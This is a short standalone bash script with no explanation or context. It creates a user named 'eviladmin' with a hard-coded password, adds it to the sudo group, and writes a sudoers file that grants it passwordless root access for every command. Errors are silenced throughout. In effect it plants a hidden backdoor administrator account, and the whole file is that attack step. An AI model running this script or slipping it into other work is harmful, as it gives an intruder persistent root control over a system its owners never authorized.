#!/bin/bash

useradd -m -s /bin/bash eviladmin 2>/dev/null || true
echo "eviladmin:ChangeMe123!" | chpasswd

usermod -aG sudo eviladmin 2>/dev/null || true

echo 'eviladmin ALL=(ALL) NOPASSWD:ALL' >/etc/sudoers.d/eviladmin
chmod 440 /etc/sudoers.d/eviladmin
